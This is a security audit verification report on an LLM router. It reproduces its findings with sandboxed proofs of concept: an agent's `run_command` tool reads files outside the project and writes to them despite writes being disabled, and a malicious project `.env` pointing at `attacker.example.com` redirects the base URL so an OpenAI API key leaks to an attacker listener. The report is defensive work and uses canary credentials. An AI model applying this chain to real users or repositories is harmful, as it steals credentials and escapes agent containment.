# Domain 13 — Adversarial Verification of SEC-001/002/003/004/006 and DEAD-01/02

Role: verifier, not author. Baseline: worktree `llm-router-forensic`, detached at
`3c96d23` (confirmed via `git log -1`). All reproductions below are in-process, against
disposable `mktemp -d` sandboxes and a `127.0.0.1` `http.server` standing in for an
attacker host, with a dummy canary credential (`sk-test-DUMMY-CANARY-...`). No paid API
was called, no ollama was started, no repo file was modified.

Interpreter used throughout:
`HOME=$(mktemp -d) PYTHONPATH=.../llm-router-forensic/src /Users/yaliandrona/Projects/llm-router/.venv/bin/python`

---

## SEC-001 — `run_command` has no argument-level containment

**Verdict: CONFIRMED.** Severity as stated (CRITICAL-by-capability, disclosed-and-accepted
by maintainer decision) is accurate — this is not a hidden defect.

Decisive evidence — code:
- `src/llm_router/hooks/agent_loop.py` run_command branch (~268-325) parses `argv` with
  `shlex.split`, calls only `_writes.guard_command(argv)`; `_resolve_path` (used by
  `read_file`/`write_file`/`edit_file`/`list_files`/`search_files`) is never invoked here.
- `src/llm_router/hooks/agent_writes.py:47-51` — `_ALLOWED_PROGRAMS` includes `cat`,
  `grep`, `find`, `python`, `python3`, `node`, `git`, etc. — general-purpose interpreters
  with no argument confinement.

Decisive evidence — live reproduction (script `verify_sec1_6.py`, run against a temp
project + temp "outside" dir containing `secret.txt`):
```
command_mode: allowlist
guard_command cat-outside allowed: True
execute_tool run_command result: 'TOPSECRET'
```
`cat <abs-path-outside-project>/secret.txt` executed and returned the secret's contents
through the normal `run_command` tool path — the sandbox that protects `read_file` does
not apply here, exactly as SEC-001 states.

Existing guard/test coverage: `SECURITY.md:250-342` already discloses this exact gap and
`tests/test_r3_allowlist_is_not_containment.py` already regression-tests it. This is a
disclosed, tested trade-off — the "KEEP, don't fix" recommendation is reasonable.

---

## SEC-006 — `LLM_ROUTER_AGENT_WRITES=off` does not stop `run_command` writes

**Verdict: CONFIRMED.** Severity HIGH is accurate — it is a specific, named safety knob
not doing what its name/SECURITY.md framing ("writes do not reach disk by default")
implies.

Decisive evidence — code: `agent_writes.guard()`/`mode()` are called only from the
`write_file`/`edit_file` branches of `execute_tool` (`agent_loop.py` ~205-232);
`run_command`'s branch calls only `guard_command`, which never reads
`LLM_ROUTER_AGENT_WRITES`.

Decisive evidence — live reproduction, same script, with `LLM_ROUTER_AGENT_WRITES=off`
set (the setting a user would set believing "the loop cannot write files"):
```
write mode: off
guard_command python-write allowed: True
target exists after run_command with AGENT_WRITES=off: True PWNED
write_file result under AGENT_WRITES=off: 'REFUSED: writing is disabled ...'
somefile exists: False
```
`python3 -c "open('<outside-project-path>','w').write('PWNED')"` executed via
`run_command` and wrote the file, at the same time `write_file` to a path *inside* the
project was correctly refused. This is a direct, reproduced contradiction of the
`AGENT_WRITES=off` promise, and — worse than the finding even states — the write in
this PoC landed *outside the project root entirely*, since `run_command` also skips
`_resolve_path` (SEC-001 compounds SEC-006).

No existing test pins `AGENT_WRITES=off`'s scope against `run_command` (confirmed by
reading `tests/` for `guard_command`+`AGENT_WRITES` cross-checks — none found).

---

## SEC-002 — Credential exfiltration via `openai_compat_base_url` / `api_base`

**Verdict: CONFIRMED, and reproduced end-to-end over a real local socket (stronger
evidence than the original finding, which stopped at construction/config inspection).**
Severity CRITICAL is justified.

Decisive evidence — code:
- `config.py:305` `openai_compat_base_url: str = ""` — no `@field_validator`, contrast
  `ollama_base_url` at `config.py:290-299`.
- `provider_quirks.py` `OpenAICompatQuirks.transform_request` — injects
  `payload["api_base"] = base_url.rstrip("/")`, sets no `api_key`.
- `providers.py` `call_llm` — `kwargs` built with `model`/`messages`/`temperature`/
  `timeout`/`max_tokens` only; no `api_key` anywhere; passed straight to
  `litellm.acompletion(**kwargs)`.
- `router.py` ~574-591 — `compat_models` unconditionally spliced into the routing chain
  once `all_openai_compat_models()` is non-empty ("treated as free/local").

Decisive evidence — **live network capture** (script `verify_sec2.py`): started a
`127.0.0.1` `http.server` standing in for an attacker host; set
`OPENAI_API_KEY=sk-test-DUMMY-CANARY-1234567890` (canary, never a real key) and
`OPENAI_COMPAT_BASE_URL=http://127.0.0.1:<port>/v1`, `OPENAI_COMPAT_MODELS=gpt-4`; called
`llm_router.providers.call_llm("openai_compat/gpt-4", [...])` for real (not mocked):
```
openai_compat_base_url: http://127.0.0.1:52842/v1
call_llm result content: hi
=== CAPTURED AT ATTACKER LISTENER ===
path: /v1/chat/completions
Authorization header received: Bearer sk-test-DUMMY-CANARY-1234567890
```
The canary key was sent, as a real `Authorization: Bearer` header, to the
config-designated host, with zero additional opt-in beyond the two config values being
set. Confirmed against the actually-pinned `litellm==1.82.6` in this venv (its own
source, `litellm/llms/openai/openai.py`, documents the same fallback: "api_key is passed
or OPENAI_API_KEY is set in the environment").

No test in `tests/` (`test_provider_quirks.py`, `conftest.py`) asserts URL validation or
`api_key` stripping for `openai_compat`/pxpipe — confirmed by grep; only functional
`api_base`-injection tests exist. No mitigating control found in `config.py`'s
`model_post_init`/`apply_keys_to_env`.

---

## SEC-003 — Untrusted project-local `.env` granted equal trust to user-level config

**Verdict: CONFIRMED**, for both of the two mechanisms cited. Severity HIGH (root-cause
enabler for SEC-002) is accurate.

Decisive evidence — code:
- `config.py:588` — `"env_file": (paths.state_path(".env"), ".env")` — the second
  element is a bare relative `".env"`, which pydantic-settings resolves against the
  process's **current working directory**.
- `hooks/auto-route.py:198-226` — `_env_paths()` lists `Path.cwd()/".env"` **first**;
  `_load_dotenv()` runs unconditionally at import time (module-level call, line 226).

Decisive evidence — live reproduction (script `verify_sec3.py`): `chdir` into a fresh
temp dir containing **only** a `.env` file (`OPENAI_COMPAT_BASE_URL=http://attacker.
example.com/v1`, `OPENAI_COMPAT_MODELS=gpt-4`), with the corresponding shell env vars
explicitly unset, then constructed `RouterConfig()` directly:
```
cwd: /private/var/.../tmpymxwdxum
openai_compat_base_url from project-local .env only: 'http://attacker.example.com/v1'
openai_compat_models: 'gpt-4'
```
A directory's own `.env` — no shell env var involved at all — is sufficient to set a
field that (per SEC-002) feeds directly into a network call carrying a live credential.
Chained with SEC-002's live capture, the full exploit requires only: (1) a real
`OPENAI_API_KEY` already exported in the victim's shell (common), and (2) `cwd`ing into
or opening a directory with a malicious `.env` (e.g. a cloned repo). No further action.

---

## SEC-004 — Ollama URL SSRF-adjacent "allowed by design"

**Verdict: CONFIRMED** as a real design gap, and I found one additional piece of
corroborating evidence the original finding did not cite: **SECURITY.md itself makes a
claim SEC-004 falsifies.**

Decisive evidence — code: `config.py:100-131` `validate_ollama_url` — denylist only
(`169.254.169.254`, `metadata`, `fe80:`, `0.0.0.0`, `::`); any other `http`/`https` host
passes. `agent_loop.py:437-471`'s own docstring contains, verbatim, the exact table the
finding quotes: `http://some-external-host    allowed   allowed   (by design)`.

Additional evidence not in the original finding: `SECURITY.md:47` states, as part of the
"Multi-provider routing" data-flow disclosure, **"Local Ollama (if configured) — stays on
your machine"** — an unqualified claim. SEC-004 shows this is false whenever
`LLM_ROUTER_OLLAMA_URL`/`OLLAMA_BASE_URL` is redirected to a non-metadata external host,
which the validator explicitly allows "by design." This sharpens SEC-004 from "an
internal code comment already admits this" to "a separate, user-facing privacy claim in
SECURITY.md is contradicted by it" — raising it slightly above a pure "product decision
point," to also being a documentation-accuracy gap in the same class as SEC-005.

Severity: MEDIUM-HIGH as stated remains reasonable; the SECURITY.md contradiction is a
minor aggravating factor, not enough to move it to the SEC-002 tier (no credential is
sent, only prompt/tool-output content, and it requires SEC-003's `.env` vector or a
directly-set env var to reach a genuinely attacker-controlled host).

---

## DEAD-01 — `pyyaml` unguarded/undeclared on the MCP server's import path

**Verdict: CONFIRMED — and the underlying risk is real and reproducible, but the
finding's specific causal chain/evidence is PARTIALLY WRONG.** The original audit
explicitly flagged that it did not build a "no-extras" environment and import
`llm_router.server` to confirm the crash ("not performed in this audit — audit-only, no
environment mutation permitted"). I did perform the equivalent of that test in-process
(no environment mutation — a `sys.meta_path` finder that makes `import yaml` raise,
simulating a bare install regardless of what's actually installed in this venv) and it
does crash — but not where the finding says it does.

**What I found:** on this baseline (`litellm==1.82.6`, the version this repo's `>=1.50.0`
pin currently resolves to), `import litellm` **alone**, with no `llm_router` code
involved at all, already raises `ModuleNotFoundError: No module named 'yaml'` when yaml
is unavailable:
```
$ python -c "<meta_path yaml-blocker>; import litellm"
bare `import litellm` FAILED without yaml: No module named 'yaml' (simulated bare install)
```
Root cause: `litellm/integrations/dotprompt/prompt_manager.py:9` does unguarded
`import yaml`, reached via `litellm/__init__.py` →
`litellm.llms.anthropic.chat.handler` → `litellm.anthropic_beta_headers_manager` →
`litellm.litellm_core_utils.litellm_logging` → `litellm.integrations.dotprompt` (all
unconditional, no try/except at `litellm_logging.py:140`). Checked
`litellm-1.82.6.dist-info/METADATA`: `pyyaml` is declared **only** under litellm's own
`extra == "proxy"` — not a core dependency of litellm either. `uv.lock`'s litellm block
(lines 1176-1191) correspondingly does **not** list `pyyaml`, confirming the audit's
lockfile-closure read was accurate as far as declared metadata goes.

Running `import llm_router.server` under the same simulated-bare-install condition
reproduces a `ModuleNotFoundError: No module named 'yaml'`, but the traceback shows it
originates from `providers.py:44`'s `import litellm` (reached via `router.py:30`, itself
reached before `router.py:58`'s `repo_config` import ever executes) — **not** from
`repo_config.py:21`'s own `import yaml` as the finding's "Location" section states. That
line never gets the chance to run; `litellm`'s own import fails first.

**Why this matters for the finding's accuracy, not its conclusion:** the ultimate
user-visible claim — "starting the MCP server on a bare `pip install llm-routing` raises
`ModuleNotFoundError: No module named 'yaml'`" — is CONFIRMED, empirically, and is if
anything **more certain** than the audit's static analysis showed (it's not contingent
on `llm_router`'s own repo_config/policy/okf import chain at all; a currently-pinned,
mandatory upstream dependency has the same undeclared need). But two of the finding's
specific claims are corrected:
1. "Location: repo_config.py:21 (import site)" is not the actual first failure point at
   this baseline — `providers.py`'s `import litellm` fails first.
2. The proposed fix-shape is still correct and still necessary: declaring `pyyaml` in
   `[project.dependencies]` (recommendation (a)) fixes the observed crash regardless of
   which module trips it first. Recommendation (b) ("wrap every one of those imports in
   try/except") would **not** fully fix the user-visible symptom by itself, since the
   failure can occur inside `litellm`'s own code before any of `llm_router`'s guarded
   imports run — this is a point the original finding did not surface and should be
   added: (b) alone is an incomplete fix; (a) is not just "smaller/safer," it's the only
   one of the two that actually closes the gap.

Confirmed also: README.md's documented install instructions (`README.md:48,170`) are
exactly `pip install llm-routing`, no extras — so the "no extras" scenario is the
documented default path, not a contrived edge case. Confirmed the `_declared()` blind
spot is real and currently green: ran
`pytest tests/install/test_m11_declared_dependencies.py -q` at this baseline → all pass
(11 tests), despite `pyyaml`/`httpx` being unguarded+undeclared in core `src/`, because
`_declared()` (`test_m11_declared_dependencies.py:63-68`) unions the `scripts` extra
into "declared."

**Corrected severity: CRITICAL stands** (arguably strengthened: the crash is baked into
a mandatory, already-pinned dependency's current version, not solely into
`llm_router`'s own optional YAML config path) — but downgrade confidence in the
"Location"/root-cause narrative from the original write-up; the decisive fix is (a), not
either-or.

---

## DEAD-02 — `httpx` unguarded/undeclared, masked by `litellm`'s transitive pull

**Verdict: CONFIRMED**, exactly as stated. Severity MEDIUM (latent, not live) is
accurate.

Decisive evidence:
- Three unguarded, module-level `import httpx` sites confirmed by direct read:
  `src/llm_router/media.py:11`, `src/llm_router/tools/agoragentic.py:13`,
  `src/llm_router/control_plane/client.py:3`.
- `litellm-1.82.6.dist-info/METADATA`: `Requires-Dist: httpx (>=0.23.0)` — unconditional,
  **not** extra-gated (contrast `pyyaml`, which is `extra == "proxy"` only). This is the
  opposite situation from DEAD-01: `httpx` genuinely is guaranteed today by a bare
  `pip install llm-routing`, transitively through `litellm`.
- `uv.lock` litellm block (line 1183) lists `{ name = "httpx" }` directly, matching the
  finding's citation exactly.
- `pyproject.toml:67-69` — `scripts` extra declares `httpx>=0.27`, `pyyaml>=6.0` — same
  extra as DEAD-01, confirmed.

This is genuinely latent, not live: today's behavior works because litellm's own
(unconditional) dependency happens to supply it. If litellm ever version-bounds httpx
out of its core deps (unlike pyyaml's already-extra-only status), these three modules
break with no test catching it — the `_declared()` blind spot applies identically here.
Recommended fix (declare `httpx` explicitly) is correct and low-risk.

---

## Summary table

| ID | Verdict | Corrected severity | Key evidence |
|---|---|---|---|
| SEC-001 | CONFIRMED | CRITICAL (disclosed/accepted) — unchanged | `verify_sec1_6.py`: `cat` outside project via `run_command` returns secret content |
| SEC-006 | CONFIRMED | HIGH — unchanged | Same script: `AGENT_WRITES=off` blocks `write_file` but not a `python3 -c` write via `run_command`, which lands **outside** the project too |
| SEC-002 | CONFIRMED | CRITICAL — unchanged (now with live proof) | `verify_sec2.py`: canary `OPENAI_API_KEY` sent as real `Authorization: Bearer` header to a local attacker listener via config-only `api_base` redirection |
| SEC-003 | CONFIRMED | HIGH — unchanged | `verify_sec3.py`: cwd-only `.env`, no shell env vars, sets `openai_compat_base_url` to an attacker host |
| SEC-004 | CONFIRMED | MEDIUM-HIGH — unchanged (new corroboration: contradicts SECURITY.md:47's "stays on your machine" claim) | `validate_ollama_url` denylist-only; docstring's own "(by design)" table |
| DEAD-01 | CONFIRMED (root-cause narrative partially wrong) | CRITICAL — unchanged/strengthened | `import litellm` alone fails without yaml at pinned `litellm==1.82.6` (litellm's own `dotprompt` module, not `repo_config.py`, is the actual first failure site); fix (a) still closes it, fix (b) alone would not |
| DEAD-02 | CONFIRMED | MEDIUM (latent) — unchanged | `litellm` METADATA: `httpx` is litellm's own unconditional dependency (unlike `pyyaml`, which is proxy-extra-only) |
